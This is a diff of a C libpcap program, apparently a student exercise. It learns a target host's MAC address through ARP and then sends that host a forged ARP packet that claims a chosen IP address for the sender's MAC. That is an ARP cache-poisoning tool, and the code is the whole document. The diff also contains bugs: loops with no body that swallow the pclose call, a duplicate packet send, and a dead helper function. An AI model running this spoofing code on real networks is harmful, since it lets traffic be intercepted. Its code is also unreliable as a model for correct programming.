@@ -1,5 +1,6 @@
 #include <pcap.h>
 #include <stdio.h>
+#include <unistd.h>
 #include <stdint.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
@@ -36,35 +37,58 @@ struct arp_hdr
           u_int8_t TargetIpAdd[IP_LEN];
         };
 
-void get_my_macadd(const char *dev, u_int8_t *my_mac, u_int8_t *my_ip)
+/*int get_my_macadd(const char *dev, u_int8_t *mac)
 {
+  int sock=socket(AF_INET,SOCK_DGRAM,0);
   struct ifreq ifr;
-  int s = socket(AF_INET,SOCK_DGRAM,0);
-
-  if(s<0)
-    perror("socket fail");
+  memset(&ifr,0X00,sizeof(ifr));
   strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
-  if(ioctl(s,SIOCGIFHWADDR,&ifr)<0)
-    perror("ioctl fail");
-  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
-    my_mac[i]=(u_int8_t)ifr.ifr_hwaddr.sa_data[i];
-  if(ioctl(s,SIOCGIFHWADDR,&ifr)<0)
-    perror("get IP fail");
+  int fd=socket(AF_INET,SOCK_DGRAM,0);
+  if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
+    perror("ioctl ");
+  mac=(u_int8_t *)ifr.ifr_hwaddr.sa_data;
+  close(sock);
 
-  *(in_addr*)my_ip=((sockaddr_in *)&ifr.ifr_addr)->sin_addr;
+  char buf[100];
+  FILE *fp;
+  fp=popen("ifconfig eth0 | grep 'HWaddr ' | awk '{ print $5}'","r");
+  if(fp==NULL)
+    return -1;
+  while(fgets(buf,sizeof(buf),fp))
+
+  pclose(fp);
+  sscanf(buf,"%u:%u:%u:%u:%u:%u",mac,mac+1,mac+2,mac+3,mac+4,mac+5);
+  for(int i=0;i<6;i++)
+  {
+    printf("%X ",mac[i]);
+  }
+}*/
+
+int get_my_ipadd(const char *dev, u_int8_t *ip)
+{
+  char buf[100];
+  FILE *fp;
+  fp=popen("hostname -I","r");
+  if(fp==NULL)
+    return -1;
+  while(fgets(buf,sizeof(buf),fp))
+
+  pclose(fp);
+  sscanf(buf,"%u.%u.%u.%u",ip,ip+1,ip+2,ip+3);
+
+  return 0;
 }
 
-int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send_ip, u_int8_t *target_ip, u_int8_t *buf)
+int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send_ip, u_int8_t *target_ip, u_int8_t *buf,int request_flag)
 {
   struct ethernet_hdr *ether=(struct ethernet_hdr *)buf;
-  struct arp_hdr *arp=(struct arp_hdr *)(buf+sizeof(struct ethernet_hdr));
+  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
   for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
   {
     ether->ether_dhost[i]=dst_mac[i];
     ether->ether_shost[i]=src_mac[i];
   }
   ether->ether_type=htons(ETHERTYPE_ARP);
-
   arp->HardwareType=htons(ARPHRD_ETHER);
   arp->ProtocolType=htons(ETHERTYPE_IP);
   arp->HardwareSize=ETHER_ADDR_LEN;
@@ -74,7 +98,7 @@ int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send
   for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
   {
     arp->SenderMacAdd[i]=src_mac[i];
-    (dst_mac[i]==0XFF)?(arp->TargetMacAdd[i]=0x00):(arp->TargetMacAdd[i]=dst_mac[i]);
+    (request_flag==0)?(arp->TargetMacAdd[i]=0x00):(arp->TargetMacAdd[i]=dst_mac[i]);
   }
 
   for(u_int8_t i=0;i<IP_LEN;i++)
@@ -84,6 +108,8 @@ int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send
   }
 
   pcap_sendpacket(handle,buf,ARP_LEN);
+  
+  printf("success\n");
   if(pcap_sendpacket(handle,buf,ARP_LEN)==-1)
   {
 	printf("ARP request fail");
@@ -95,39 +121,37 @@ int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send
  
 int recv_reply(pcap_t *handle,u_int8_t *target_ip,u_int8_t *victim_mac)
 {
+  int reply_flag=0;
+
   for(u_int8_t i=0;;i++)
   {
     struct pcap_pkthdr* header;
     const u_char* packet;
-    int cnt=0;
-    int flag=0;
     int res = pcap_next_ex(handle, &header, &packet);
     if (res == 0) continue;
     if (res == -1 || res == -2) break;
- 
+
     struct ethernet_hdr *ether=(struct ethernet_hdr *)packet;
    
     if(htons(ether->ether_type)==ETHERTYPE_ARP)
     {
-	  struct arp_hdr *arp=(struct arp_hdr *)(packet+sizeof(struct ethernet_hdr));
+	  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
 	  if(arp->Opcode==htons(ARPOP_REPLY))
 	  {
-	    for(u_int8_t i=0;i<IP_LEN;i++)
-	    {
-		if(arp->SenderIpAdd[i]==target_ip[i])
-		  cnt++;
-		if(cnt==4)
+		if((arp->SenderIpAdd[0]==target_ip[0]) && (arp->SenderIpAdd[1]==target_ip[1]) && (arp->SenderIpAdd[2]==target_ip[2]) && (arp->SenderIpAdd[3]==target_ip[3]))
 		{
 		  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
-		    victim_mac[i]=arp->SenderMacAdd[i];
-		  flag=1;	
+		  victim_mac[i]=arp->SenderMacAdd[i];
 		}
-	    }
+		  reply_flag=1;
 	  }
     }
-
-  if(flag==1)
-    break;
+    
+    if(reply_flag==1)
+    {
+      printf("SMA:%X:%X:%X:%X:%X:%X\n",victim_mac[0],victim_mac[1],victim_mac[2],victim_mac[3],victim_mac[4],victim_mac[5]);
+      break;
+    }
   }
 
   return 1;
@@ -143,6 +167,7 @@ int main(int argc, char* argv[]) {
     usage();
     return -1;
   }
+  int request_flag=0;
   u_int8_t broadcastmac[ETHER_ADDR_LEN]={0XFF,0XFF,0XFF,0XFF,0XFF,0XFF};
   u_int8_t my_mac[ETHER_ADDR_LEN];
   u_int8_t my_ip[IP_LEN];
@@ -161,12 +186,24 @@ int main(int argc, char* argv[]) {
   
   inet_pton(AF_INET,argv[2],sender_ip);
   inet_pton(AF_INET,argv[3],target_ip);
-  get_my_macadd(dev,my_mac,my_ip);
-  send_req(handle,my_mac,broadcastmac,my_ip,target_ip,buf);
+  //get_my_macadd(dev,my_mac);
+  get_my_ipadd(dev,my_ip);
+  
+  u_int8_t sock=socket(AF_INET,SOCK_DGRAM,0);
+  struct ifreq ifr;
+  memset(&ifr,0X00,sizeof(ifr));
+  strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
+  u_int8_t fd=socket(AF_INET,SOCK_DGRAM,0);
+  if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
+    perror("ioctl ");
+  for(int i=0;i<6;i++)
+  my_mac[i]=(u_int8_t)ifr.ifr_hwaddr.sa_data[i];
+  close(sock);
+
+  send_req(handle,my_mac,broadcastmac,my_ip,target_ip,buf,request_flag);
   recv_reply(handle,target_ip,victim_mac);
-  send_req(handle,my_mac,victim_mac,sender_ip,target_ip,buf);
+  request_flag=1;
+  send_req(handle,my_mac,victim_mac,sender_ip,target_ip,buf,request_flag);
   pcap_close(handle);
   return 0;
 }
-
-
